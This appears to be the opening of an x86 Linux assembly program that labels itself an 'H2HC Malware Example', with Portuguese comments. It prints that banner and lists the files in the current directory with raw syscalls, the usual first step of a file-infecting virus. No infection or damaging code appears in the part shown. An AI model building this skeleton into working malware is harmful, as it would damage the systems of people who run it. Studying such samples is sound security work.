	BITS 32

	mov edx, 21

        push dword 0x000a656c   ; 20
        push dword 0x706d6178   ; 16
        push dword 0x45206572   ; 12
        push dword 0x61776c61   ; 8
        push dword 0x4d204348   ; 4
        push word 0x3248        ; 0
	
	mov ecx, esp
	mov ebx,1
	mov eax,4
	int 0x80

list_files:     
        push word 0x002e
	mov     ebx, esp	;path para diretorio "."atual
	xor     ecx, ecx	;0
	xor     edx, edx	;0
	mov     eax, sys_open	;abertura do diretorio (syscall open)
	int     0x80

        add esp, 2
        push eax          ; save fd on stack
        pop ebx

	sub     esp,0x10000	;aloca buffer na pilha

	mov     ecx, esp
	mov     edx, 0x10000
	mov     eax, sys_getdents	;listagem do diretorio (syscall getdents)
	int     0x80

	xor edi,edi	    ;nÃºmero de bytes lidos armazenado em edi
	mov edi,eax
        
        xor eax, eax
        xor ebx, ebx
        xor ecx, ecx
        xor edx, edx


